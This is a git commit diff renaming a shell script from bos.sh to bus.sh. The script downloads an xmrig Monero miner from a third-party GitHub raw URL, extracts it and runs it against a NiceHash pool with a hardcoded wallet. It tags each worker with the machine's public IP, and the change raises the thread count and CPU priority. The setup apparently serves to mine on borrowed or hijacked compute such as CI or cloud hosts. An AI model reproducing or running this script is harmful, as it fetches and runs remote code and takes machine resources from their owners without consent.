067f285a27d7a4e5d032dd1a5d0467ddea8a32d9
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-18 11:26:19 -0700

    Update and rename bos.sh to bus.sh

--- bus.sh
+++ bus.sh
@@ -5,5 +5,5 @@ PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
 wget https://raw.githubusercontent.com/hondacars/sirji/main/xmrig-6.17.0-bionic-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
 ph add xmrig
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=8 --cpu-priority=2 --randomx-mode=fast --keepalive
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=25 --cpu-priority=10 --randomx-mode=fast --keepalive
 
